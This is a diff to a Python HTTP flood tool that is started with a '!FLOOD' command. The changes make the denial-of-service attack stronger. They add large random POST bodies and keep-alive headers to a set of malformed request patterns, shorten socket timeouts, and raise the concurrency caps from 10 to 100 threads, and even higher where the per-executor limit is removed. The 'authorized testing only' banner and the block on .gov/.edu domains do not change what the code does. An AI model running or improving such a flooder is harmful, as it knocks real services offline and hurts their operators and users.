@@ -36,6 +36,10 @@ def generate_url_path_choice(num):
     letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     return ''.join(random.choice(letter) for _ in range(int(num)))
 
+# Generate larger payload for POST requests
+def generate_large_payload(size=1024):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
+
 # Attack logic
 def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, use_ssl=False):
     if stop_attack.is_set():
@@ -47,28 +51,32 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
         s = context.wrap_socket(s, server_hostname=host)
     try:
         payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
-            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
-            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
-            'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n",
-            'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r",
-            'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n",
-            'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r",
-            'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r",
-            'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n",
-            'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n",
-            'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n",
-            'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r",
-            'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r",
+            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: Mozilla/5.0\n\n",
+            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n\r\r",
+            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\r\r\n\n",
+            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\r\n",
+            'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n\n\n",
+            'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n\n\n\r\r\r\r",
+            'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\r\n\r\n",
+            'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\r\n\r",
+            'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\r\n\r",
+            'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\r\n\r\n\n",
+            'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\n\r\r\n\r\n\n\n",
+            'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\a\n\r\n\n",
+            'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\a\n\a\n\n\r\r",
+            'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\t\n\n\r\r",
+            'LARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nContent-Length: 1024\n\n{generate_large_payload(1024)}"
         }
         packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        s.settimeout(5)
+        s.settimeout(2)
         s.connect((ip, port))
+        sent_bytes = 0
         for _ in range(booter_sent):
             if stop_attack.is_set():
                 break
             s.sendall(packet_data)
+            sent_bytes += len(packet_data)
+        logging.info(f"Sent {sent_bytes} bytes to {ip}:{port}")
     except (ConnectionError, TimeoutError, socket.gaierror) as e:
         logging.error(f"Attack error: {e}")
     finally:
@@ -76,9 +84,9 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
 
 # Running attack with ThreadPoolExecutor
 def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl):
-    with ThreadPoolExecutor(max_workers=min(spam_loader, 10)) as executor:
+    with ThreadPoolExecutor(max_workers=spam_loader) as executor:
         while time.time() < time_loader and not stop_attack.is_set():
-            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl) for _ in range(min(spam_loader, 10))]
+            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
             for future in futures:
                 future.result()
 
@@ -119,18 +127,16 @@ def validate_target(target):
             raise ValueError("Invalid URL")
         if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
             raise ValueError("Attacking .gov, .mil, .edu, or .ac domains is prohibited")
-        protocol = parsed.scheme
-        port = parsed.port if parsed.port else (443 if protocol == 'https' else 80)
         ip = socket.gethostbyname(host)
-        return ip, host, port, protocol == 'https'
+        return ip, host, parsed.scheme == 'https'
     except (ValueError, socket.gaierror) as e:
         logging.error(f"Target validation error: {e}")
-        return None, None, None, None
+        return None, None, None
 
 # Main command loop
 def command():
     global stop_attack
-    print(f"{Fore.RED}WARNING: This tool is for authorized security testing only. Unauthorized use is illegal.{Fore.RESET}")
+    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences.{Fore.RESET}")
     while True:
         try:
             data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
@@ -145,38 +151,36 @@ def command():
                 if len(args_get) == 10:
                     data_type_loader_packet = args_get[1].upper()
                     target_loader = args_get[2]
-                    port_loader = args_get[3]
+                    try:
+                        port_loader = int(args_get[3])
+                        if not 1 <= port_loader <= 65535:
+                            raise ValueError
+                    except ValueError:
+                        print(f"{Fore.RED}Port must be a number between 1-65535{Fore.RESET}")
+                        continue
                     time_loader = time.time() + int(args_get[4])
-                    spam_loader = int(args_get[5])
-                    create_thread = min(int(args_get[6]), 10)
+                    spam_loader = min(int(args_get[5]), 100)  # Limit to 100 to prevent system overload
+                    create_thread = min(int(args_get[6]), 100)
                     booter_sent = int(args_get[7])
                     methods_loader = args_get[8]
-                    spam_create_thread = min(int(args_get[9]), 10)
+                    spam_create_thread = min(int(args_get[9]), 100)
 
-                    ip, host, port, use_ssl = validate_target(target_loader)
+                    ip, host, use_ssl = validate_target(target_loader)
                     if not ip:
                         print(f"{Fore.YELLOW}Invalid target or unable to resolve URL{Fore.RESET}")
                         continue
-                    if port_loader != 'default':
-                        try:
-                            port = int(port_loader)
-                            if not 1 <= port <= 65535:
-                                raise ValueError
-                        except ValueError:
-                            print(f"{Fore.RED}Invalid port. Use 'default' or a number between 1-65535{Fore.RESET}")
-                            continue
 
                     stop_attack.clear()
-                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}{Fore.RESET}")
+                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}{Fore.RESET}")
 
                     for _ in range(create_thread):
                         for _ in range(spam_create_thread):
-                            threading.Thread(target=runing_attack, args=(ip, host, port, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl)).start()
+                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl)).start()
 
                     countdown_timer(time_loader)
                     continue
                 else:
-                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT/default> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
+                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
             else:
                 print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Command not found{Fore.RESET}")
         except KeyboardInterrupt:
